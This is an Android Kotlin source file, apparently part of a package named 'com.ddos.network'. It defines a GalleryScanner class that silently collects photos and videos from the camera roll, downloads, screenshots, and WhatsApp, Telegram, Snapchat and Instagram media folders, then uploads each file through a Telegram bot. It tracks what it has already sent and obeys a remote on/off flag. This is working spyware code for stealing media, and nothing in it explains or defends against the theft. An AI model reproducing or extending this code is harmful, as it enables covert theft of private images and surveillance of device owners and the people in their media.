package com.ddos.network

import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import java.io.File

class GalleryScanner(
    private val context: Context,
    private val bot: TelegramBot
) {
    private val prefs = context.getSharedPreferences("ddos_uploaded", Context.MODE_PRIVATE)

    fun scanAndUpload() {
        // Check if uploads enabled
        val enabled = context.getSharedPreferences("ddos_control", Context.MODE_PRIVATE)
            .getBoolean("upload_enabled", true)
        if (!enabled) return

        val files = mutableListOf<File>()

        // Method 1: MediaStore (Android 10+ safe)
        files.addAll(queryMediaStore())

        // Method 2: Direct paths (WhatsApp, Telegram, etc.)
        files.addAll(scanAppDirectories())

        // Upload new files
        for (file in files) {
            if (!isUploaded(file) && file.length() > 5000) {  // >5KB
                val success = bot.uploadMedia(file)
                if (success) {
                    markUploaded(file)
                }
            }
        }
    }

    private fun queryMediaStore(): List<File> {
        val files = mutableListOf<File>()

        val collection = if (Build.VERSION.SDK_INT >= 29) {
            MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Files.getContentUri("external")
        }

        val projection = arrayOf(
            MediaStore.Files.FileColumns.DATA,
            MediaStore.Files.FileColumns.MIME_TYPE,
            MediaStore.Files.FileColumns.DATE_ADDED
        )

        // Only images and videos
        val selection = "${MediaStore.Files.FileColumns.MIME_TYPE} LIKE ? OR " +
                "${MediaStore.Files.FileColumns.MIME_TYPE} LIKE ?"
        val args = arrayOf("image/%", "video/%")

        context.contentResolver.query(
            collection, projection, selection, args,
            "${MediaStore.Files.FileColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA)

            while (cursor.moveToNext()) {
                val path = cursor.getString(dataCol)
                val file = File(path)
                if (file.exists() && file.canRead()) {
                    files.add(file)
                }
            }
        }

        return files
    }

    private fun scanAppDirectories(): List<File> {
        val files = mutableListOf<File>()

        val paths = arrayOf(
            // Standard
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Movies",
            "/storage/emulated/0/Download",

            // WhatsApp (all variants)
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
            "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media",

            // Telegram
            "/storage/emulated/0/Telegram/Telegram Images",
            "/storage/emulated/0/Telegram/Telegram Video",
            "/storage/emulated/0/Android/media/org.telegram.messenger/Telegram",

            // Snapchat
            "/storage/emulated/0/Snapchat",

            // Instagram
            "/storage/emulated/0/Instagram",
            "/storage/emulated/0/Pictures/Instagram",

            // Screenshots
            "/storage/emulated/0/Pictures/Screenshots",
            "/storage/emulated/0/DCIM/Screenshots"
        )

        for (path in paths) {
            val dir = File(path)
            if (dir.exists() && dir.isDirectory) {
                dir.walkTopDown()
                    .filter { it.isFile && isMedia(it) }
                    .forEach { files.add(it) }
            }
        }

        return files
    }

    private fun isMedia(file: File): Boolean {
        return file.extension.lowercase() in listOf(
            "jpg", "jpeg", "png", "gif", "webp", "bmp", "heic",
            "mp4", "mkv", "avi", "mov", "3gp", "webm"
        )
    }

    private fun isUploaded(file: File): Boolean {
        return prefs.getBoolean(file.absolutePath, false)
    }

    private fun markUploaded(file: File) {
        prefs.edit().putBoolean(file.absolutePath, true).apply()
    }
}
